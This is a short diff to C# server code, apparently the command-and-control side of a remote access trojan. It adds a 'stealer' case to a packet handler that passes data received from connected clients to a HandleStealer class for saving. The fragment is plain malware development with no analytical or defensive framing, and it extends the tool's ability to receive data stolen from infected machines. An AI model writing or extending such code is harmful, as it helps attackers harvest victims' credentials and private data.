@@ -214,6 +214,11 @@ namespace Server.Handle_Packet
                                 new HandleFun().Fun(client, unpack_msgpack);
                                 break;
                             }
+                        case "stealer":
+                            {
+                                new HandleStealer().SaveData(client, unpack_msgpack);
+                                break;
+                            }
                     }
                 }));
             }
